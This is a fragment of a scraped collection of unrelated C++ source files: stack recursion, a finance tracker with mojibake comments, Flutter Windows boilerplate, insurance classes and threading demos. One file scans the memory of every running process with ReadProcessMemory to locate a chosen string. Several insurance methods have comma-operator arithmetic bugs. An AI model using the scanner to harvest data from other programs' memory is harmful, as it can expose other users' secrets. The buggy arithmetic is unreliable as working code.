std::to_string(static_cast<int>(std::round(100.0 * fac",
    "#include <iostream>\n#include<stack>\nusing namespace std;\n// void Solve(stack<int> &s, int target){\n//   if(s.empty()){\n//     s.push(target);\n//     return;\n//   }\n//   int topelement=s.top();\n//   s.pop();\n//   //recursive call\n//   Solve(s,target);\n//   //backtrack\n//   s.push(topelement);\n// }\nvoid insertAtBottom(stack<int>&s,int target){\n  if(s.empty()){\n    s.push(target);\n    return;\n  }\n  int topelement=s.top();\n  s.pop();\n  //recursive call\n  insertAtBottom(s,target);\n  //backtrack\n  s.push(topelement);\n}\n\nvoid reversestack(stack<int>& s){\n  //base case\n  if(s.empty()){\n    return;\n  }\n  int target=s.top();\n  s.pop();\n\n  //reverse stack\n  reversestack(s);\n  //insert at bottom\n  insertAtBottom(s,target);\n}\n\nvoid insertSorted(stack<int>&s, int target){\n  //base case\n  if(s.empty()){\n    s.push(target);\n    return;\n  }\n  if(s.top()>=target){\n    s.push(target);\n    return;\n  }\n\n  int topelement=s.top();\n  s.pop();\n  insertSorted(s,target);\n  //BT\n  s.push(topelement);\n}\nvoid sortStack(stack<int>&s){\n  //base case\n  if(s.empty()){\n    return;\n  }\n  int topelement=s.top();\n  s.pop();\n//recursion\n  sortStack(s);\n  //insert\n  insertSorted(s,topelement);\n}\nint main() {\n  // stack<int>s;\n  // s.push(10);\n  //  s.push(20);\n  //  s.push(30);\n  //  s.push(40);\n  //  s.push(50);\n  // if(s.empty()){\n  //   cout<<\"Stack is empty\"<<endl;\n  //   return 0;\n  // }\n  // int target=s.top();\n  // s.pop();\n  \n  // insertAtBottom(s,target);\n\n  // cout<<\"Printing Stack \"<<endl;\n\n  // while(!s.empty()){\n  //   cout<<s.top()<<\" \";\n  //   s.pop();\n  // }\n\n\n  //reverse a stack\n  // stack<int>s;\n  // s.push(10);\n  // s.push(20);\n  // s.push(30);\n  // s.push(40);\n  // s.push(50);\n\n  // // cout<<\"Printing Stack \"<<endl;\n\n  // // while(!s.empty()){\n  // //   cout<<s.top()<<\" \";\n  // //   s.pop();\n  // // }\n  // reversestack (s);\n\n  // cout<<\"Printing Stack \"<<endl;\n\n  // while(!s.empty()){\n  //   cout<<s.top()<<\" \";\n  //   s.pop();\n  // }\n\n\n\n  //sort a stack\n  stack<int>s;\n  s.push(7);\n  s.push(11);\n  s.push(3);\n  s.push(5);\n  s.push(9);\n\n  sortStack(s);\n\n  cout<<\"Printing Stack \"<<endl;\n\n  while(!s.empty()){\n    cout<<s.top()<<\" \";\n    s.pop();\n  }cout<<endl;\n  return 0;\n}",
    "#include <iostream>\n#include <vector>\n#include <fstream>\n#include <unordered_map>\n#include <algorithm>\n\nusing namespace std;\n\n// \u00d1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e0 \u00e4\u00eb\u00ff \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\nstruct Expense {\n    string category;\n    double amount;\n    string date;\n};\n\n// \u00d1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e0 \u00e4\u00eb\u00ff \u00e3\u00e0\u00ec\u00e0\u00ed\u00f6\u00b3\u00e2\nstruct Wallet {\n    string name;\n    double balance;\n\n    // \u00ca\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0 \u00e4\u00eb\u00ff \u00b3\u00ed\u00b3\u00f6\u00b3\u00e0\u00eb\u00b3\u00e7\u00e0\u00f6\u00b3\u00bf \u00e3\u00e0\u00ec\u00e0\u00ed\u00f6\u00ff \u00e7 \u00b3\u00ec'\u00ff\u00ec \u00f2\u00e0 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00ee\u00e2\u00e8\u00ec \u00e1\u00e0\u00eb\u00e0\u00ed\u00f1\u00ee\u00ec\n    Wallet(string walletName, double initialBalance) : name(walletName), balance(initialBalance) {}\n};\n\n// \u00ca\u00eb\u00e0\u00f1 \u00e4\u00eb\u00ff \u00f3\u00ef\u00f0\u00e0\u00e2\u00eb\u00b3\u00ed\u00ed\u00ff \u00f4\u00b3\u00ed\u00e0\u00ed\u00f1\u00e0\u00ec\u00e8\nclass FinanceManager {\nprivate:\n    vector<Wallet> wallets; // \u00e3\u00e0\u00ec\u00e0\u00ed\u00f6\u00b3 \u00f2\u00e0 \u00bf\u00f5 \u00e1\u00e0\u00eb\u00e0\u00ed\u00f1\u00e8\n    vector<Expense> expenses; // \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\n\npublic:\n    // \u00c4\u00ee\u00e4\u00e0\u00f2\u00e8 \u00e3\u00e0\u00ec\u00e0\u00ed\u00e5\u00f6\u00fc\n    void addWallet(string walletName) {\n        wallets.push_back(Wallet(walletName, 0.0));\n    }\n\n    // \u00cf\u00ee\u00ef\u00ee\u00e2\u00ed\u00e8\u00f2\u00e8 \u00e3\u00e0\u00ec\u00e0\u00ed\u00e5\u00f6\u00fc\n    void deposit(string walletName, double amount) {\n        for (size_t i = 0; i < wallets.size(); ++i) {\n            if (wallets[i].name == walletName) {\n                wallets[i].balance += amount;\n                break;\n            }\n        }\n    }\n\n    // \u00c4\u00ee\u00e4\u00e0\u00f2\u00e8 \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\u00f3\n    void addExpense(string category, double amount, string date) {\n        expenses.push_back(Expense{ category, amount, date });\n    }\n\n    // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e8\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00e7\u00e0 \u00e4\u00e5\u00ed\u00fc\n    void generateDailyReport(string date) {\n        double totalExpenses = 0.0;\n        cout << \"Daily Report for \" << date << \":\" << endl;\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            if (expenses[i].date == date) {\n                totalExpenses += expenses[i].amount;\n                cout << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << endl;\n            }\n        }\n        cout << \"Total Expenses: \" << totalExpenses << endl;\n    }\n\n    // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e8\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00e7\u00e0 \u00f2\u00e8\u00e6\u00e4\u00e5\u00ed\u00fc\n    void generateWeeklyReport(string startDate, string endDate) {\n        double totalExpenses = 0.0;\n        cout << \"Weekly Report from \" << startDate << \" to \" << endDate << \":\" << endl;\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            if (expenses[i].date >= startDate && expenses[i].date <= endDate) {\n                totalExpenses += expenses[i].amount;\n                cout << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << endl;\n            }\n        }\n        cout << \"Total Expenses: \" << totalExpenses << endl;\n    }\n\n    // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e8\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00e7\u00e0 \u00ec\u00b3\u00f1\u00ff\u00f6\u00fc\n    void generateMonthlyReport(string month) {\n        double totalExpenses = 0.0;\n        cout << \"Monthly Report for \" << month << \":\" << endl;\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            if (expenses[i].date.substr(0, 7) == month) {\n                totalExpenses += expenses[i].amount;\n                cout << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << endl;\n            }\n        }\n        cout << \"Total Expenses: \" << totalExpenses << endl;\n    }\n\n    // \u00d4\u00ee\u00f0\u00ec\u00f3\u00e2\u00e0\u00ed\u00ed\u00ff \u00d2\u00ce\u00cf-3 \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2 \u00e7\u00e0 \u00ef\u00e5\u00e2\u00ed\u00e8\u00e9 \u00ef\u00e5\u00f0\u00b3\u00ee\u00e4 (\u00f2\u00e8\u00e6\u00e4\u00e5\u00ed\u00fc \u00e0\u00e1\u00ee \u00ec\u00b3\u00f1\u00ff\u00f6\u00fc)\n    void generateTopExpenses(string periodStart, string periodEnd) {\n        unordered_map<string, double> categorySums; // \u00f1\u00eb\u00ee\u00e2\u00ed\u00e8\u00ea \u00e4\u00eb\u00ff \u00f1\u00f3\u00ec \u00ea\u00ee\u00e6\u00ed\u00ee\u00bf \u00ea\u00e0\u00f2\u00e5\u00e3\u00ee\u00f0\u00b3\u00bf\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            const Expense& expense = expenses[i];\n            if (expense.date >= periodStart && expense.date <= periodEnd) {\n                categorySums[expense.category] += expense.amount;\n            }\n        }\n\n        // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e5\u00ed\u00ed\u00ff \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0\u00e0 \u00ef\u00e0\u00f0 <\u00ea\u00e0\u00f2\u00e5\u00e3\u00ee\u00f0\u00b3\u00ff, \u00f1\u00f3\u00ec\u00e0> \u00e7\u00b3 \u00f1\u00eb\u00ee\u00e2\u00ed\u00e8\u00ea\u00e0\n        vector<pair<string, double>> categorySumsVec;\n        categorySumsVec.reserve(categorySums.size());\n        for (auto it = categorySums.begin(); it != categorySums.end(); ++it) {\n            categorySumsVec.push_back(make_pair(it->first, it->second));\n        }\n\n        // \u00d1\u00ee\u00f0\u00f2\u00f3\u00e2\u00e0\u00ed\u00ed\u00ff \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0\u00e0 \u00e7\u00e0 \u00f1\u00ef\u00e0\u00e4\u00e0\u00ed\u00ed\u00ff\u00ec \u00f1\u00f3\u00ec\n        sort(categorySumsVec.begin(), categorySumsVec.end(), [](const pair<string, double>& a, const pair<string, double>& b) {\n            return a.second > b.second;\n            });\n\n        // \u00c2\u00e8\u00e2\u00e5\u00e4\u00e5\u00ed\u00ed\u00ff \u00d2\u00ce\u00cf-3 \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\n        cout << \"TOP-3 Expenses for the period \" << periodStart << \" to \" << periodEnd << \":\" << endl;\n        size_t limit = min(static_cast<size_t>(3), categorySumsVec.size());\n        for (size_t i = 0; i < limit; ++i) {\n            cout << i + 1 << \". Category: \" << categorySumsVec[i].first << \", Total amount: \" << categorySumsVec[i].second << endl;\n        }\n    }\n\n    // \u00c7\u00e1\u00e5\u00f0\u00e5\u00e3\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00f2\u00e0 \u00f0\u00e5\u00e9\u00f2\u00e8\u00ed\u00e3\u00e8 \u00f3 \u00f4\u00e0\u00e9\u00eb\n    void saveToFile(string filename) {\n        ofstream outFile(filename);\n        if (outFile.is_open()) {\n            outFile << \"Expenses:\" << endl;\n            size_t expensesSize = expenses.size();\n            for (size_t i = 0; i < expensesSize; ++i) {\n                outFile << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << \", Date: \" << expenses[i].date << endl;\n          ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\ufeff#include <iostream>\n#include <cstdlib>\n#include <vector>\n#include <fstream>\n#include <string>\n\nusing namespace std;\nclass Database;\nclass PassportData {\nprivate:\n    int id;\n    string name;\n    string surname;\n    string number;\npublic:\n    PassportData(string name, int id, string surname,\n        string number) : name(name), id(id), surname(surname), number(number) {}\n    virtual ~PassportData() {}\n\n    int getId() const { return id; }\n    string getName() const { return name; }\n    string getSurname() const { return surname; }\n    string getNumber() const { return number; }\n};\nclass Employee {\npublic:\n    Employee(string name, int id, double salary,\n        Database* db) : name(name), id(id), salary(salary), db(db) {}\n    virtual ~Employee() {}\n    virtual void work() = 0;\n    virtual void print_info() const {\n        cout << \"Name: \" << name << \", ID: \" << id << \", Salary: \" << salary << endl;\n    }\n    string getname() { return name; }\n    int getid() { return id; }\n    double getsalary() { return salary; }\n    void setPassportData(PassportData* newpassport) {\n        passport = newpassport;\n    }\nprotected:\n    string name;\n    int id;\n    double salary;\n    Database* db;\n    PassportData* passport;\n};\nclass Policy;\nclass Agent : public Employee {\npublic:\n    Agent(string name, int id, double salary, Database* db) : Employee(name, id, salary,db) {}\n    void work() override {\n        cout << \"Agent is working with clients.\" << endl;\n    }\n    void print_info() const {\n        cout << \"\u0418\u043c\u044f \u0430\u0433\u0435\u043d\u0442\u0430: \" << name << \", ID \u0430\u0433\u0435\u043d\u0442\u0430: \" << id << \", \u0437\u0430\u0440\u043f\u043b\u0430\u0442\u0430: \" << salary << endl;\n    }\n    void setprice(int number);\n};\nclass Database; \nclass Manager : public Employee {\npublic:\n    Manager(string name, int id, double salary, Database* db) : Employee(name, id, salary,db) {}\n    void work() override {\n        cout << \"Manager is managing employees.\" << endl;\n    }\n    void addAgent(Agent* agent);\n    void removeAgent(int id);\n};\nclass Policy {\npublic:\n    Policy(int number, double price, double coverage)\n        : number(number), price(price), coverage(coverage) {}\n    virtual ~Policy() {}\n    virtual void print_info() const {\n        cout << \"Number: \" << number << \", Price: \" << price << \", Coverage: \" << coverage << endl;\n    }\n    void setprice(double newprice) {\n        price = newprice;\n    }\n    int getnumber() { return number; }\n    double getprice() { return price; }\n    double getcoverage() { return coverage; }\n    virtual string getPolicy() = 0;\nprivate:\n    int number;\n    double price;\n    double coverage;\n};\nclass Car {\nprivate:\n    double price;\n    string type;\npublic:\n    Car(double price, string type) : type(type), price(price) {}\n    string getType() {\n        return type;\n    }\n    double getPrice() const { return price; }\n\n};\nclass PassengerCar : public Car {\npublic:\n    PassengerCar(double price, string type, int seats) : Car(price, type), seats(seats) {}\n    int getSeats() const { return seats; }\n    double getPrice() const { return price * 0, 10 * seats; }\n\nprivate:\n    int seats; // \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043c\u0435\u0441\u0442 \u0432 \u043b\u0435\u0433\u043a\u043e\u0432\u043e\u043c \u0430\u0432\u0442\u043e\u043c\u043e\u0431\u0438\u043b\u0435\n    double price;\n\n};\nclass TruckCar : public Car {\npublic:\n    TruckCar(double price, string type, double loadCapacity) : Car(price, type), loadCapacity(loadCapacity) {}\n    double getLoadCapacity() const { return loadCapacity; }\n    double getPrice() const { return price * 0,010* loadCapacity; }\n\nprivate:\n    double price;\n    double loadCapacity; // \u0413\u0440\u0443\u0437\u043e\u043f\u043e\u0434\u044a\u0435\u043c\u043d\u043e\u0441\u0442\u044c \u0433\u0440\u0443\u0437\u043e\u0432\u0438\u043a\u0430\n};\nclass CarPolicy : public Policy {\nprivate:\n    double price;\n    int number;\n    Car* car;\npublic:\n    CarPolicy(int number, double price, double coverage)\n        : Policy(number, price, coverage), price(600), number(1) {}\n    ~CarPolicy() {}\n    string getPolicy() override {\n        return \"Car_policy\";\n    }\n    void setprice(double newprice) {\n        price = newprice;\n    }\n    void setCar(Car* newCar) {\n        car = newCar;\n    }\n    Car* getCar() const {\n        return car;\n    }\n};\nclass Realty {\nprivate:\n    double price;\n    string type;\npublic:\n    string getType() {\n        return type;\n    }\n    Realty(double price, string type) : type(type), price(price) {}\n    double getPrice() const { return price; }\n};\nclass House : public Realty {\npublic:\n    House(double price, string type, int rooms) : Realty(price, type), rooms(rooms) {}\n    int getRooms() const { return rooms; }\n    double getPrice() const { return price * 0,5 *rooms; }\n\nprivate:\n    int rooms;\n    double price;\n};\nclass Flat : public Realty {\npublic:\n    Flat(double price, string type, int floor) : Realty(price, type), floor(floor) {}\n    int getFloor() const { return floor; }\n    double getPrice() const { return price*0,75* floor; }\nprivate:\n    int floor;\n    double price;\n\n};\nclass HomeInsurancePolicy : public Policy {\npublic:\n    HomeInsurancePolicy(int number, double price, double coverage)\n        : Policy(number, price, coverage), price(2000), number(2) {}\n    ~HomeInsurancePolicy() {}\n    string getPolicy() override {",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nvoid rotate(vector<int> &arr)\n{\n    int last_element = arr.back();\n    arr.pop_back();\n    arr.insert(arr.begin(), last_element);\n}\n\nstring isomorphMatrix(string s)\n{\n    int sizeOfString = s.size();\n    vector<int> temp;\n    map<char, int> charMap;\n    int uniqueCharCount = 0;\n    for (char c : s)\n    {\n        if (charMap.find(c) == charMap.end())\n        {\n            charMap[c] = uniqueCharCount++;\n        }\n        temp.push_back(charMap[c]);\n    }\n\n    vector<vector<int>> tempArr(sizeOfString, vector<int>(sizeOfString));\n\n    for (int i = 0; i < sizeOfString; i++)\n    {\n        for (int j = 0; j < sizeOfString; j++)\n        {\n            tempArr[i][j] = temp[j];\n        }\n        rotate(temp);\n    }\n\n    string matrixString = s;\n    for (int i = 0; i < sizeOfString; i++)\n    {\n        for (int j = 0; j < sizeOfString; j++)\n        {\n            matrixString += to_string(tempArr[i][j]);\n        }\n    }\n\n    return matrixString;\n}\n\nsize_t calcHash(string s)\n{\n    size_t p = 31;\n    size_t m = 1e9 + 9;\n    size_t hash_value = 0;\n    size_t p_pow = 1;\n    for (char c : s)\n    {\n        hash_value = (hash_value + (c - 'a' + 1) * p_pow) % m;\n        p_pow = (p_pow * p) % m;\n    }\n    return hash_value;\n}\n\nint main()\n{\n    string password = \"egg\";\n    string matrixString = isomorphMatrix(password);\n    size_t hashValue = calcHash(matrixString);\n    cout << hashValue;\n    return 0;\n}",
    "#include <intrin.h>\n#include <memory>\n#include <algorithm>\n#include <vector>\n#include <functional>\n#include <string>\n#include <iostream>\n#include <windows.h>\n#include <psapi.h>\n\n#define cpuid(info, x)    __cpuidex(info, x, 0)\n\ninline void __intr(BOOL& _SSE, BOOL& _AVX, BOOL& _AVX512) {\n    int info[4];\n    cpuid(info, 0);\n    int nIds = info[0];\n\n    cpuid(info, 0x80000000);\n\n    _SSE = _AVX = _AVX512 = 0;\n\n    if (nIds >= 0x00000001) {\n        cpuid(info, 0x00000001);\n        _SSE = (info[3] & ((int)1 << 25)) != 0;\n        _AVX = (info[2] & ((int)1 << 28)) != 0;\n    }\n\n    if (nIds >= 0x00000007) {\n        cpuid(info, 0x00000007);\n        _AVX512 = (info[1] & ((int)1 << 16)) != 0;\n    }\n}\n\n__forceinline void RPM(const std::string& __str, BOOL SSE, BOOL AVX, BOOL AVX512) {\n    /*\n    push ebp\n        mov ebp, esp\n        sub esp, __LOCAL_SIZE\n        push ebx\n        push esi\n        push edi\n\n    */\n    DWORD p[1024], n, j;\n    if (!K32EnumProcesses(p, sizeof(p), &n)) {\n        std::cerr << \"Failed to enumerate all processes in the system.\" << std::endl;\n        return;\n    }\n    j = n / sizeof(DWORD);\n    DWORD _p = GetCurrentProcessId();\n\n    // My custom KMP algorithm\n    std::vector<int> lps(__str.size(), 0);\n    int len = 0;\n    for (size_t i = 1; i < __str.size();) {\n        if (__str[i] == __str[len]) {\n            len++;\n            lps[i] = len;\n            i++;\n        }\n        else {\n            if (len != 0) {\n                len = lps[static_cast<std::vector<int, std::allocator<int>>::size_type>(len) - 1];\n            }\n            else {\n                lps[i] = 0;\n                i++;\n            }\n        }\n    }\n\n    for (DWORD i = 0; i < j; i++) {\n        DWORD __p = p[i];\n        if (__p == 0 || __p == 4 || __p == 140 || __p == 104 || __p == _p) {\n            continue;\n        }\n\n        HANDLE h = OpenProcess((0x0400) | (0x0010), 0, __p);\n        if (h != 0) {\n            printf(\"Scanning Process: %d\\n\", __p);\n\n            SYSTEM_INFO s;\n            GetSystemInfo(&s);\n            MEMORY_BASIC_INFORMATION z{};\n            BOOL x = 0;\n\n            for (LPVOID addr = s.lpMinimumApplicationAddress; addr < s.lpMaximumApplicationAddress;\n                addr = (LPBYTE)z.BaseAddress + z.RegionSize) {\n                if (VirtualQueryEx(h, addr, &z, sizeof(z)) == sizeof(z)) {\n                    if (z.State == 0x00001000 && !(z.Protect & 0x100) && !(z.Protect & 0x01)) {\n                        std::vector<char> n(z.RegionSize);\n                        SIZE_T r;\n\n                        if (ReadProcessMemory(h, z.BaseAddress, n.data(), z.RegionSize, &r)) {\n                            char* dataPtr = n.data();\n                            if (AVX512) {\n                                const size_t z = __str.size();\n                                const size_t s = 64;\n\n                                size_t __avx512 = (r - z) / s;\n\n                                __m512i cmp = _mm512_loadu_epi32(reinterpret_cast<const __m512i*>(__str.c_str()));\n\n                                for (size_t i = 0; i < __avx512; ++i) {\n                                    __m512i data = _mm512_loadu_epi32(reinterpret_cast<const __m512i*>(dataPtr + i * s));\n\n                                    size_t j = 0;\n                                    while (j < s) {\n                                        __m512i cmpData = _mm512_loadu_epi32(reinterpret_cast<const __m512i*>(dataPtr + i * s + j));\n                                        __mmask64 m = _mm512_cmpeq_epu8_mask(cmpData, cmp);\n\n                                        if (m != 0) {\n                                            size_t k = 0; \n                                            /*\n                                            If you want to only search for ASCII characters:\n                                            if (dataPtr[i * s + j] >= 32 && dataPtr[i * s + j] <= 126) {\n                                            */\n                                            for (; k < z; ++k) {\n                                                if (dataPtr[i * s + j + k] != __str[k]) {\n                                                    break;\n                                                }\n                                            }\n                                            if (k == z) {\n                                                printf(\"[+] String detected in %d\\n\", __p);\n                                                x = 1;\n                                                break;\n                                            }\n                                            j += k - lps[k - 1];\n                                        }\n                                        else {\n                                            ++j;\n                                        }\n                                    }\n                                }\n                            }\n                            else if (AVX) {\n                                const size_t z = __str.si",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"giri\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include \"BST.h\"\n\nusing namespace std;\n\nint main(int argc, char* argv[] ) {\n\n\n    if(argc == 4){\n        BST bst;\n        string file = argv[1];\n        ifstream fin(\"../tests/\" + file);\n        string line;\n        //read file and insert into the tree\n        if (fin.is_open()) {\n            while (getline(fin, line)) {\n                bst.insert(line);\n            }\n        }\n        fin.close();\n\n        std::cout << bst << std::endl;\n        string out_file = argv[2];\n        bst.save_tree_to_file(out_file);\n\n        string test_file = argv[3];\n        ifstream input(\"../tests/\" + test_file);\n        string word;\n        string pure_word;\n        if (input.is_open()) {\n            //loop through each word and search if the word is in the tree\n            while (getline(input, word, ' ')) {\n                bst.search_tree(word);\n            }\n        }\n        input.close();\n    }else{\n        cout<<\"Please enter the required parameters Arg1 = program file(Assignment_3.exe), Arg2 = file name(dictionary.txt), Arg3 = file name (output.txt), Arg4 = file name(test.txt). \\n \"\n              \"Find the output file in output directory\"<<endl;\n    }\n\n\n    return 0;\n}\n\n\n",
    "#include <iostream>\n#include <unistd.h>\n\ntypedef struct{\n\tint flag;\n\tchar sym;\n}t_Args;\n\nvoid *first(void *arg1){\n\tstd::cout << \"1st stream started\" << '\\n';\n\tt_Args *args = (t_Args*) arg1;\n\twhile(args->flag == 0){\n\t\tputchar(args->sym);\n\t\tfflush(stdout);\n\t\tsleep(1);\n\t}\n\tstd::cout << \"1st stream stopped\" << '\\n';\n\tpthread_exit((void*)\"first\");\n}\n\nvoid *second(void *arg2){\n\tstd::cout << \"2nd stream started\" << '\\n';\n\tt_Args *args = (t_Args*) arg2;\n\twhile(args->flag == 0){\n\t\tputchar(args->sym);\n\t\tfflush(stdout);\n\t\tsleep(1);\n\t}\n\tstd::cout << \"2nd stream stopped\" << '\\n';\n\tpthread_exit((void*)\"second\");\n}\n\nint main(){\n\tt_Args arg1 = {0, '1'};\n\tt_Args arg2 = {0, '2'};\n\tpthread_t id1, id2;\n\tpthread_create(&id1, nullptr, first, &arg1);\n\tpthread_create(&id2, nullptr, second, &arg2);\n\tstd::cout << \"Enter any character to continue\" << '\\n';\n\tgetchar();\n\tstd::cout << \"Program is working\" << '\\n';\n\targ1.flag = 1;\n\targ2.flag = 1;\n\tchar *ex1, *ex2;\n\tpthread_join(id1, (void**) &ex1);\n\tpthread_join(id2, (void**) &ex2);\n\tstd::cout << \"ex1 = \" << ex1 << '\\n';\n\tstd::cout << \"ex2 = \" << ex2 << '\\n';\n\tstd::cout << \"Program successfully executed!\" << '\\n';\n\treturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"stateful\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  